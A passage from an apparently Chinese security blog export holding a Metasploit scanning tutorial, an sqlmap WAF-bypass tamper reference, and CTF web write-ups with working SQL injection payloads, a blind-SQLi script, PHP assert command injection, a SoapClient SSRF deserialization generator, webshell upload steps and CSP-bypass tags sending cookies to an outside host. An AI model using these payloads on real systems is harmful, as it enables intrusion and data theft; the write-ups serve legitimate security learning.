postgres:password@127.0.0.1/msf\n```\n\n待metasploit生成必须数据表后会返回终端指令符等待指令\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722225301.png)\n\n执行`db_status`命令确认数据连接是否正确\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722225416.png)\n\n#### 将数据导入metasploit\n\n执行nmap生成基本xml报告\n\n```\nnmap -Pn -sS -A -oX data.xml 192.168.48.0/24\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722225937.png)\n\n执行`db_import`命令将文件导入数据库中\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722230042.png)\n\n执行`hosts`命令核实导入的结果\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722230126.png)\n\n如果想删除数据库中的数据，可以使用`hosts -d`删除现有的数据\n\n### 高级扫描技巧：TCP空闲扫描\n\n这种扫描让我们冒充网络上另一台主机的IP地址，对目标进行更为隐秘的扫描\n\n使用metasploit框架的`scanner/ip/ipidseq`模块寻找满足TCP空闲扫描要求的空闲主机\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722230602.png)\n\nRHOSTS参数可以使用IP段(如192.168.1.100-192.168.1.200)，也可以使用CIDR(无类型域间选路)地址块(如192.168.1.0/24)和多个CIDR地址块(192.168.1.0/24，192.168.2.0/24)，以及每行包含一个ip地址的IP列表文本文件\n\nTHREADS设定扫描的线程数\n\n现在将RHOSTS设定为192.168.48.0/24，THREADS设定为50运行扫描\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722231324.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722231344.png)\n\nIncremental代表IP帧标识发生断档即该主机可用于空闲扫描，在nmap中使用`-sI`选项指定扫描获取的192.168.48.2作为空闲主机对目标主机进行扫描\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722231924.png)\n\n### 在MSF终端中运行nmap\n\nmetasploit能够和nmap结合使用，首先保证数据库连接成功\n\n输入`db_nmap`命令，它能使得MSF运行nmap并自动将nmap结果存储到msf数据库中\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722232638.png)\n\n可以执行`services`命令查看数据库中关于系统运行服务的扫描结果\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722232746.png)\n\n### 使用metasploit进行端口扫描\n\n除了使用nmap等第三方扫描器，metaspliot的辅助模块中也包含了几款内建的端口扫描器\n\n执行`search portscan`命令查看metasploit框架提供的端口扫描工具\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722233541.png)\n\n使用syn端口扫描器对单个主机进行扫描\n\n输入`use scanner/portscan/syn`，设定RHOSTS和THREADS执行扫描\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200722235703.png)\n\n### 针对性扫描\n\n针对性扫描是指寻找目标网络中存在的已知可利用漏洞或能够轻松获取后门的特定操作系统，服务，软件以及配置缺陷\n\n#### 服务器消息块协议扫描\n\nMetasploit可以利用它的smb_version模块来遍历一个网络并获取windows系统的版本号\n\n执行扫描如下：\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200723203548.png)\n\n#### 搜寻配置不当的Microsoft SQL Server\n\nMS SQL通常作为常用软件如(Microsoft Visual Studio)安装的先决条件被自动的安装在系统上，导致很多管理员会忽略该服务软件的存在，如此一来，这种情况下安装的MS SQL服务器软件通常没有实际的用处，也很少安装补丁程序\n\nMS SQ:安装后默认监听在TCP端口1433或使用随机的动态TCP端口，Metaspliot提供了一个mssql_ping模块帮助你找到MS SQL服务器监听的TCP端口\n\n执行扫描如下：\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200723204619.png)\n\n#### SSH服务器扫描\n\n使用ssh_version模块识别目标服务器上运行的SSH版本\n\n执行如下：\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200723205209.png)\n\n#### FTP扫描\n\nFTP服务器通常是进入一个目标网络最便捷的途径，使用ftp_version模块对FTP服务进行扫描\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200723212827.png)\n\n成功识别FTP服务器，之后可以使用scanner/ftp/anonymous模块检查一下这台FTP服务器是否允许匿名用户登录\n\n#### 简单网管协议扫描\n\n简单网管协议(SNMP)通常用于网络设备中，用来报告带宽利用率、冲突率和以及其他信息，但一些操作系统也包含SNMP服务器软件，主要用来提供类似CPU利用率、空闲内存和其他系统状态\n\n可访问的SNMP服务器能够泄露某些特点系统的相当多的信息，甚至导致设备被远程攻陷。例如，如果能得到既有可读可写的Cisco路由器SNMP团体字符串，便可以下载整个路由器的配置，对其进行i修改并传回路由器中\n\nMetasploit框架中包含一个内置的辅助模块scanner/snmp/snmp_enum。我们可以尝试对一个ip或一段ip使用字典来猜解SNMP团体字符串。","tags":["metasploit"],"categories":["渗透测试"]},{"title":"sqlmap脚本速查","url":"/2020/07/20/sqlmap_temper/","content":"\n把自己tamper里的脚本用法在网上搜了下\n\n<!-- more -->\n\n\n\n| 脚本名称                     | 作用说明                                                     |\n| :--------------------------- | ------------------------------------------------------------ |\n| apostrophemask.py            | 将引号替换成UTF-8，用于过滤单引号                            |\n| apostrphenullencode.py       | 用非法双字节Unicode字符替换单引号                            |\n| appendnullbyte.py            | 在有效负荷的结束位置加载零字节字符编码                       |\n| base64encode.py              | 替换成base64编码                                             |\n| between.py                   | 用not between 0 and替换大于号，用between and替换等于号       |\n| bluecoat.py                  | 在SQL语句之后用有效的随机空白替换空格符，随后用like替换等于号 |\n| chardoubleencode.py          | 对给定的payload全部字符使用双重url编码                       |\n| charencode.py                | 对给定的payload全部字符使用URL编码，例如SE-> ％53％45        |\n| charunicodeencode.py         | 字符串Unicode编码，例如SE->％u0053％u0045                    |\n| charunicodeescape.py         | Unicode转义给定有效负载中的未编码字符，例如SE-> \\ u0053 \\ u0045 |\n| commalesslimit.py            | 用'LIMIT N OFFSET M'替换（MySQL）实例，例如'LIMIT M,N'       |\n| commalessmid.py              | 用'MID（A FROM B FOR C）'替换（MySQL）实例，例如'MID(A,B,C)' |\n| commentbeforeparentheses.py  | 在括号前加（内联）注释（例如（（-> / ** /（）                |\n| concat2concatws.py           | 用'CONCAT_WS(MID(CHAR(0),0,0),A,B)' 等价物替换（MySQL）实例，例如'CONCAT(A,B)' |\n| equaltolike.py               | 将等号替换为like                                             |\n| escapequotes.py              | 斜杠转义单引号和双引号                                       |\n| greatest.py                  | 绕过对大于号的过滤，用GREATEST替换大于号                     |\n| halfversionedmorekeywords.py | 当数据库为MySQL时绕过防火墙，在每个关键字之前添加MySQL版本注释 |\n| hex2char.py                  | 替换每个（MySQL）0x等效的CONCAT（CHAR（），...）编码字符串   |\n| htmlencode.py                | HTML编码所有非字母数字字符                                   |\n| ifnull2casewhenisnull.py-    | 替换'IFNULL( A，B)'与'CASE WHEN ISNULL（A）THEN（B）ELSE（A）END'对应 |\n| ifnull2ifsnull.py            | 绕过对ifnull的过滤，替换类似IFNULL(A,B)为IF(ISNULL(A),B,A)   |\n| informationschemacomment.py  | 在所有出现的（MySQL）“information_schema”标识符的末尾添加一个内联注释（/ ** /） |\n| least.py                     | 用'LEAST'对应替换大于运算符（'>'）                           |\n| lowercase.py                 | 用小写值替换每个关键字字符                                   |\n| luanginx.py                  | LUA-Nginx WAF绕过（例如Cloudflare）                          |\n| modsecurityversioned.py      | 包含带有（MySQL）版本注释的完整查询                          |\n| multiplespaces.py            | 围绕SQL关键字添加多个空格                                    |\n| modsecurityversioned.py      | 过滤空格，使用MySQL内联注释的方式进行注入                    |\n| modsecurityzeroversioned.py  | 使用MySQL内联注释的方式进行注入                              |\n| multiplespaces.py            | 在SQL关键字周围添加多个空格                                  |\n| nonrecursivereplacement.py   | 作为双重查询语句，用双重语句替换预定义的SQL关键字            |\n| overlongutf8.py              | 将给定有效载荷中的所有（非字母数字）字符转换为超长UTF8       |\n| overlongutf8more.py          | 将给定有效载荷中的所有字符转换为超长UTF8                     |\n| percentage.py                | 在每个字符前面添加一个百分号（'％'）                         |\n| plus2concat.py               | 替换加号运算符（'+'）与（MsSQL）函数CONCAT（）对应           |\n| plus2fnconcat.py             | 用（MsSQL）ODBC函数{fn CONCAT（）}替换加号（'+'）对应项      |\n| randomcase.py                | 随机大小写                                                   |\n| randomcomments.py            | 用/**/分割SQL关键字                                          |\n| securesphere.py              | 追加特制的字符串                                             |\n| sp_password.py               | 从DBMS日志的自动模糊处理的有效载荷追加sp_password            |\n| space2comment.py             | 将空格替换成/**/                                             |\n| space2dash.py                | 用短划线注释（'-'）替换空格字符（''），后跟一个随机字符串和一个新的行（'\\ n'） |\n| space2hash.py                | 将空格替换为#号，并添加一个随机字符串和换行符                |\n| space2morecomment.py         | 替换（MySQL）带注释'/ ** _ ** /' 的空格字符（''）实例        |\n| space2moreshash.py           | 将空格替换为#号，并添加一个随机字符串和换行符                |\n| space2mssqlblank.py(mssql)   | 将空格替换成其他空符号                                       |\n| space2mysqlblank.py          | 将空格替换为其他空白符号(适用于MySQL)                        |\n| space2mysqlhash.py           | 将空格替换为–，并添加一个换行符                              |\n| space2mssqlhash.py           | 将空格替换为#号，并添加一个换行符                            |\n| space2plus.py                | 用+号代替空格                                                |\n| space2randomblank.py         | 将空格替换为其他有效字符                                     |\n| substring2leftright.py       | 用LEFT和RIGHT替换PostgreSQL SUBSTRING                        |\n| symbolicologic.py            | 用其符号对应物（&&和\\|\\|）替换AND和OR逻辑运算符              |\n| unionalltounion.py           | 用UNION SELECT对应项替换UNION ALL SELECT的实例               |\n| unmagicquotes.py             | 用一个多字节组合和末尾通用注释一起替换空格                   |\n| uppercase.py                 | 用大写值替换每个关键字字符                                   |\n| unionalltounion.py           | 将union all select 替换成union select                        |\n| varnish.py                   | 附加HTTP标头'X-originating-IP'以绕过Varnish防火墙            |\n| versionedkeywords.py         | 用（MySQL）版本注释将每个非功能性关键字括起来                |\n| versionedmorekeywords.py     | 每个关键字包含（MySQL）版本注释                              |\n| xforwardedfor.py             | 附加伪造的HTTP标头'X-Forwarded-For'                          |\n\n\n​\t\n​\t","tags":["sqlmap"],"categories":["tool"]},{"title":"61dctfweb复现","url":"/2020/07/19/61dctf_web/","content":"\n刷题平台+1\n\n<!-- more -->\n\n平台地址：https://www.jarvisoj.com/\n\n### babyphp\n\n扫描一波发现git泄露\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719144256.png)\n\ngithack把源码下下来，得到几个php文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719144836.png)\n\nindex,php里除了html片段还有php，flag.php有flag但是不可读\n\n```\n<?php\nif (isset($_GET['page'])) {\n        $page = $_GET['page'];\n} else {\n        $page = \"home\";\n}\n$file = \"templates/\" . $page . \".php\";\nassert(\"strops('$file', '..') === false\") or die(\"Detected hacking attempt!\");\nassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");\n?>\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719145815.png)\n\n因此我们的目的是把服务器中的flag.php读出来。\n\n想办法把命令注入到php当中去，php中能够用 and 和 | 来执行多条命令，假如我们传入`$page=','..')===false and system('cat templates/flag.php') and strop('`\n\n那么`$file = templates/','..')===false and system('cat templates/flag.php') and strops('`\n\nassert语句就变成了`assert(\"strops('templates/','..')===false and system('cat templates/flag.php') and strops('') === false\")`\n\n这样，中间的system就单独借助assert执行了。\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719152937.png)\n\n### admin\n\ndirsearch扫一波发现robots.txt，打开给出admin_s3cr3t.php\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719153324.png)\n\n访问给了个假flag\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719153521.png)\n\ncookie里有个admin=0，改成1即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719153752.png)\n\n### inject\n\n首页只有一个flag{xxx}，dirsearch依旧，发现有备份文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719155540.png)\n\n源码如下：\n\n```\n<?php\nrequire(\"config.php\");\n$table = $_GET['table']?$_GET['table']:\"test\";\n$table = Filter($table);\nmysqli_query($mysqli,\"desc `secret_{$table}`\") or Hacker();\n$sql = \"select 'flag{xxx}' from secret_{$table}\";\n$ret = sql_query($sql);\necho $ret[0];\n?>\n```\n\n用到了desc显示查询结果，mysql中，对于\n\n```\ndesc `1` `2`;\n```\n\n如果1这个表存在，那么整个语句是能够正常执行的，那么我们构造\n\n```\nflag` `union select 1--+\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719162956.png)\n\n用limit把显示结果调换一下\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719163454.png)\n\n那么对1这个位置注入\n\n表名：\n\n```\nflag` `union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1--+\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719163538.png)\n\n列名，嗯。。。单引号好像被过滤了，那么把表名转为16进制再传\n\n```\nflag` `union select group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167 limit 1,1--+\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719164102.png)\n\nflag：\n\n```\nflag` `union select group_concat(flagUwillNeverKnow) from secret_flag limit 1,1--+\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719164337.png)\n\n### babyxss\n\n首页说可以发消息给管理员\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719130949.png)\n\n随便发一条试一下，verify用'0694'开头的字符串过不去，我估么着应该是少写了个md5，爆破一下即可\n\n```\nimport hashlib\n\ndef func(md5_val):\n    for x in range(999999, 100000000):\n        md5_value=hashlib.md5(str(x).encode(encoding='utf-8')).hexdigest()\n        if md5_value[:4]==md5_val:\n            return str(x)\n\nif __name__ == '__main__':\n    print(func('9e87'))\n```\n\n通过验证说管理员已经收到并且会查看\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719131442.png)\n\n开始想到的是xss把管理员的cookie带出来了，用xss平台的payload发现啥信息也收不到，抓包发现是设置了**CSP**\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200719131649.png)\n\n没了解过，正好学习一下\n\nCSP全称是内容安全策略，可以用于检测并削弱XSS的攻击性，它通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。\n\n配置CSP涉及到添加 [`Content-Security-Policy`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy) HTTP头部到一个页面，并配置相应的值，以控制用户代理（浏览器等）可以为该页面获取哪些资源。\n\n指定策略格式如下：\n\n```\nContent-Security-Policy: policy\n```\n\npolicy参数是一个包含了各种描述你的CSP策略指令的字符串。\n\n常见的策略方案可参考：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP\n\n这里我们可以看到添加了两个策略：`default-src 'self'`; `script-src 'self'`，也就是只能加载同源脚本。\n\n参考[这位师傅](https://www.jianshu.com/p/f1de775bc43e)的文章了解到CSP策略可以被绕过，比如对link标签的预加载功能处理不当。\n\nChrome下，可以使用如下标签发送cookie:\n\n```\n<link rel=\"prefetch\" href=\"http://xss.pt/xxx\">\n```\n\nfirefox下可以将cookie作为子域名，用dns预解析的方式把cookie带出去:\n\n```\n<link rel=\"dns-prefetch\" href=\"//[cookie].xxx.ceye.io\">\n```\n\n不知道为啥不管用firefox还是chrome发过去啥反应没有。。。。。看了其他师傅好像这种情况挺多。。。那就放这吧先，看以后有没有机会搞清楚咋回事。","tags":["xss","CSP","sql","bypass"],"categories":["CTF"]},{"title":"De1CTF2019——ShellShellShell","url":"/2020/07/17/[De1CTF 2019]ShellShellShell/","content":"\n平台：buuoj.cn\n打开靶机是一个登录框\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200716163552947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n扫描器发现一些文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200716173658153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n后缀有个`~`还是第一次见，了解到是编辑器留下的备份文件，访问确实有源码\n把几个文件都复制下来看看，seay审计软件爆了几个危险部分\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200716190304331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n看下位置代码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200716190929706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n将传入的参数传到数据库执行。注意到还有一个get_column函数\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200716220553608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n传入的反引号会被替换成单引号。为sql注入创造了条件\n看下哪个方法用到了insert函数\n找到：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020071621441436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n可以看到我们可以post一个signature去insert，并且这里对于这个参数是没有任何过滤的，所以很容易造成Sql注入\n想要publish，就必须登录。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200716220808233.png)\n因此我们`?action=register`来注册一个账号并登录\n然后注册和登录就必须通过code验证\n可以看到是一个简单的md5碰撞，脚本爆破即可\n\n```php\nimport hashlib\n\ndef func(md5_val):\n    for x in range(999999, 100000000):\n        md5_value=hashlib.md5(str(x).encode(encoding='utf-8')).hexdigest()\n        if md5_value[:5]==md5_val:\n            return str(x)\n\nif __name__ == '__main__':\n    print(func('ac7a2'))\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200716221056709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200716221325866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n登录成功我们来抓publish的包验证sql注入\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200716221639298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n根据代码语句构造payload：\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200716221742595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n那么确认了sql注入的存在，由于回显都是ok，考虑时间盲注\n编写脚本：\n\n```php\nimport requests\n\nurl=\"http://f19eea67-1117-416a-9834-1d58c44d1f53.node3.buuoj.cn/index.php?action=publish\"\ncookie = {\"PHPSESSID\":\"05gn4tlsacq7pfundd7f89f983\"}\n\nk=\"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\nflag=\"\"\n\nfor i in range(50): \n    for j in k:\n        j = ord(j)\n        data={\n            'mood':'0',\n            'signature':'1`,if(ascii(substr((select password from ctf_users where username=`admin`),{},1))={},sleep(3),0))#'.format(i,j)\n            }\n        try:\n            r=requests.post(url,data=data,cookies=cookie,timeout=(2,2))\n        except:\n            flag+=chr(j)\n            print(flag)\n            break\n```\n至于这里为什么是知道跑admin和ctf_users表，嗯。。。。。看代码得到的\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200716224909501.png)\n跑出密码的md5：`c991707fdf339958eded91331fb11ba0`\n网站解密得`jaivypassword`\n知道了admin和password，我们来试着登录\n却登录失败\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200716225347570.png)\n原来设置了ip限制\n![在这里插入图片描述](https://img-blog.csdnimg.cn/202007162254256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n跟进get_ip函数\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200716225458365.png)\n看来只有真实管理员地址才能登录\n这里就出现了另一个考点：**soapclient反序列化配合ssrf**\n通过`?action=phpinfo`看到php开启了soap拓展\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200716233422392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\nPHP 中，soap扩展可以用来提供和使用 Web Services，关于Web Services，[百度百科](https://baike.baidu.com/item/Web%20Service/1215039?fr=aladdin)\nsoapclient类则是用来创建soap数据报文，与wsdl接口进行交互，它有几个内置魔术方法\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020071623374458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n回到代码，showmess函数中有一个反序列化点\n![](https://img-blog.csdnimg.cn/20200716231933426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n反序列化`$row[2]`的值也就是`$mood`是我们可控的，假如我们把反序列化语句插入到注入语句中，比如\n\n```php\na`,{serialize);#\n```\n它传入库中，我们访问`index.php?action=index `的时候就会触发\n来实际操作一下\n首先一个页面保持自己的非admin账号登录状态，另开一个页面不登录，这里为了防止cookie干扰就直接另开一个浏览器\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717093435307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717093451148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n接着开始构造soap，原理参考[这位师傅](https://xz.aliyun.com/t/2148#toc-0)\n```php\n<?php\n$target = 'http://127.0.0.1/index.php?action=login';\n$post_string = 'username=admin&password=jaivypassword&code=1174162';\n$headers = array(\n    'X-Forwarded-For: 127.0.0.1',\n    'Cookie: PHPSESSID=c10j7vc0fu9v8gf52qt9st4pr0'\n    );\n$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => \"aaab\"));\n\n$aaa = serialize($b);\n$aaa = str_replace('^^',\"\\r\\n\",$aaa);\n$aaa = str_replace('&','&',$aaa);\necho bin2hex($aaa);\n?>\n```\n这里注意code和PHPSESSID要和未登录页面保持一致\n把生成的poc在publish插进去\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717100124148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n刷新一下?action=index使得库中的数据触发\n这时`$mood`就是一个soap类，反序列化之后它访问不存在的方法就会触发内置`__call()`魔术方法\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717102938344.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717104345257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n也就是给该session登录的用户管理员身份\n用另一个页面登录管理员账号看看\n成功登录\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717100023992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n点开publish是一个上传\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717104607913.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n让我们传图片但啥也没过滤，直接一句话传成功\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717105336123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n蚁剑连上\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717105607205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n之前说了flag在内网，查看下内网信息\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717110225698.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n扫下其他内网主机的端口\n发现11主机开了80端口\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717110503559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n访问下有内容\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717110711187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n保存下来\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717110822143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n得到源码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717110812894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n有两层需要绕过\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717113228784.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717113246813.png)\n第一层数组来绕过，第二层随机文件名用路径穿越绕过。\n构造`file[1]=aaa&file[0]=php/../blacknight.php`\npostman构造传入\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717122058563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n点击右上方的code选择php-cURL生成代码\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200717122124852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n但没有我们上传的内容所以要自己构造，这里参考[赵总](https://www.zhaoj.in/read-6170.html)\n最终exp：\n\n```php\n<?php\n\n$curl = curl_init();\n\ncurl_setopt_array($curl, array(\n  CURLOPT_URL => \"http://173.24.214.11\",\n  CURLOPT_RETURNTRANSFER => true,\n  CURLOPT_ENCODING => \"\",\n  CURLOPT_MAXREDIRS => 10,\n  CURLOPT_TIMEOUT => 30,\n  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,\n  CURLOPT_CUSTOMREQUEST => \"POST\",\n  CURLOPT_POSTFIELDS => \"------WebKitFormBoundary7MA4YWxkTrZu0gW\\r\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"blacknight.php\\\"\\r\\nContent-Type: 